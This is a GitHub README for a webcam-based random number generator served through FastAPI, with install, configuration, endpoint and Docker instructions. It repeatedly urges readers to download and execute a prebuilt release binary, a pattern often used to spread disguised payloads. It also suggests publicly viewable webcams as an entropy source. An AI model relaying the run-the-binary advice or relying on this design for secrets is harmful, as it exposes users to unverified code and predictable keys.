https://github.com/vinith200527/webcam-trng/releases

# Webcam TRNG — True Random Generator from Live Webcam Entropy

[![Releases](https://img.shields.io/github/v/release/vinith200527/webcam-trng?logo=github&label=Releases&color=0e8a16)](https://github.com/vinith200527/webcam-trng/releases) [![Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/) [![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)](LICENSE)

![Webcam entropy](https://images.unsplash.com/photo-1516117172878-fd2c41f4a759?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=1f6f2a998b5f6e6b9a2c4a5e3b7b12b8)

A compact, auditable true-random number generator (TRNG) that extracts entropy from live webcams. This project adapts ideas from Cloudflare's LavaRand and uses live video frames as an entropy source. The system serves randomness through a small FastAPI microservice and includes utilities for entropy collection, health checks, and NIST-style testing.

Topics: cryptography • entropy • fastapi • nist • python • rng • trng • webcam • security

Built for developers, researchers, and security teams who want a reproducible TRNG pipeline with clear components and test hooks.

Key features
- Live webcam entropy: sample motion, noise, and pixel variation from public webcams or local cameras.
- FastAPI server: request random bytes via HTTP/JSON or raw endpoint.
- Entropy pooling: mix multiple frames with cryptographic hash (BLAKE2b) and XOR pools.
- NIST test hooks: run frequency and entropy estimation routines for verification.
- Configurable seeding: allow user-supplied entropy or remote webcam list.
- Portable Python stack: minimal native deps, Docker support.

How it works (high level)
- Capture frames from a webcam stream at configurable intervals.
- Convert each frame to raw bytes (YUV/RGB) and feed into a cryptographic mixer.
- Accumulate entropy in two pools: fast pool and slow pool.
- When an API request arrives, derive output from the pools with a DRBG step.
- Periodically run self-tests and log entropy metrics.

Project image and icon
- Use camera and randomness imagery to keep context clear.
- Example icon: ![Camera icon](https://upload.wikimedia.org/wikipedia/commons/3/3f/Camera_font_awesome.svg)

Quick links
- Releases: https://github.com/vinith200527/webcam-trng/releases
- If you plan to run a packaged release, download and execute the release file from that page. The release contains prebuilt artifacts (example name: webcam_trng-v1.0.0-linux-x86_64.tar.gz). After download, extract and run the included binary or installer for your platform.

Why use webcam entropy
- Webcams produce unpredictable environmental noise.
- Many webcams expose micro-variations in sensor, exposure, and scene motion.
- Mixed with cryptographic hashing, these variations produce high-quality entropy suitable for non-critical TRNG uses and testing.

Security and scope
- The system targets entropy collection and local distribution. Do not replace hardware RNGs for high-assurance devices without a security review.
- The design uses well-known cryptographic primitives. The code stays auditable and modular.

Getting started

Prerequisites
- Python 3.8 or newer
- pip
- A webcam, a public webcam URL (MJPEG/HTTP stream), or a recorded video file
- Optional: Docker for containerized runs

Install from source
1. Clone repository
```bash
git clone https://github.com/vinith200527/webcam-trng.git
cd webcam-trng
```
2. Create virtualenv and install
```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Run the FastAPI server
```bash
# sample: use local webcam index 0
export CAMERA_SOURCE=0
uvicorn trng.api:app --host 0.0.0.0 --port 8000 --workers 1
```
Endpoints
- GET /health — service status and pool metrics
- GET /random?n=32 — return 32 random bytes base64
- GET /random/raw?n=32 — return raw bytes (application/octet-stream)
- POST /seed — inject external entropy (accepts base64)

CLI utilities
- trng-collect — capture frames and print entropy stats
- trng-test-nist — run a subset of NIST tests and output pass/fail stats

Install a release build
- Visit the Releases page: https://github.com/vinith200527/webcam-trng/releases
- Download the artifact for your platform.
- Extract and run the included binary or installer.
- Example execution on Linux:
```bash
tar xzf webcam_trng-v1.0.0-linux-x86_64.tar.gz
cd webcam_trng
./webcam_trng --config config.yaml
```

Configuration reference (config.yaml)
```yaml
camera:
  source: 0            # index or URL
  fps: 2               # frames per second
capture:
  frame_size: [640,480]
  format: rgb
mixer:
  hash: blake2b
  out_size: 64
pools:
  fast_pool_threshold: 64
  slow_pool_threshold: 512
api:
  host: 0.0.0.0
  port: 8000
logging:
  level: info
```

Entropy design details
- Frames convert to raw pixel bytes. We include both luminance and chrominance data when available.
- Each frame goes through a hash-based extractor (BLAKE2b) before feeding pools.
- Pools rotate on thresholds. Fast pool serves frequent small requests. Slow pool replenishes periodically.
- We use a reseed strategy inspired by DRBG patterns. Each output mixes current pool state, a counter, and a fresh hash digest.
- The code logs estimated entropy per sample using min-entropy heuristics and compression ratios.

NIST and test hooks
- The repo includes tools to run statistical tests similar to NIST SP800-22 (frequency, runs, spectral).
- Use trng-test-nist to generate test vectors and output CSV of results.
- The test tool supports batch mode for live capture or file-based replay.

Benchmarks
- Throughput: request sizes of 32–4096 bytes scale linearly up to pool rate.
- Latency: cold-start includes camera warm-up and hashing. Steady-state requests return within 10–50 ms on modern CPUs.
- Tests run on CI with synthetic cameras (recorded video) to simulate public webcam variability.

Privacy and ethics
- The system can use public webcams. Do not capture private or sensitive scenes.
- Prefer public-facing or owned cameras.
- The software focuses on pixel noise and low-level sensor variation. It does not attempt to extract identifiable content.

Docker
- Build:
```bash
docker build -t webcam-trng:latest .
```
- Run with local camera (Linux):
```bash
docker run --device=/dev/video0 -e CAMERA_SOURCE=0 -p 8000:8000 webcam-trng:latest
```

Integration and examples

Python client
```python
import requests, base64

r = requests.get("http://localhost:8000/random?n=32")
data = r.json()["data"]
raw = base64.b64decode(data)
print(raw.hex())
```

Curl
```bash
curl "http://localhost:8000/random?n=64"
```

Advanced: pool monitoring
- The /health endpoint returns objects:
  - fast_pool_entropy_estimate
  - slow_pool_entropy_estimate
  - frames_captured
  - last_frame_hash

Operational tips
- Rotate camera sources to avoid stale scenes.
- Cross-feed multiple cameras for entropy mixing.
- Run the NIST hooks after large deployments to collect baseline metrics.

Testing and CI
- The repository includes unit tests for capture, mixer, and DRBG components.
- CI runs tests with recorded video files to guarantee determinism.
- Use pytest:
```bash
pytest tests/
```

Contributing
- Fork the repo and create a feature branch.
- Run tests and static checks.
- Open a PR with a clear description and tests.
- We accept focused patches, security fixes, and reproducible benchmarks.

Releases and binaries
- Visit the releases page to find packaged builds and checksums:
  https://github.com/vinith200527/webcam-trng/releases
- Download the release file for your platform and execute it per included README. The release artifact contains a checksum file and an install script. Verify the checksum before running the binary.

License
- MIT License. See LICENSE for full text.

Acknowledgments
- Design inspired by LavaRand concepts and community work on entropy harvesting.
- Open-source camera streams and public datasets served as test material.

Contact
- Open issues on GitHub for bugs, feature requests, or security reports.
- For security matters, create a private issue marked security.

Badges and quick access
[![Releases](https://img.shields.io/badge/Get%20Release-Download-blue?logo=github)](https://github.com/vinith200527/webcam-trng/releases)

README generated to help users deploy, test, and integrate a webcam-based TRNG. Follow the Releases page to download and execute packaged artifacts.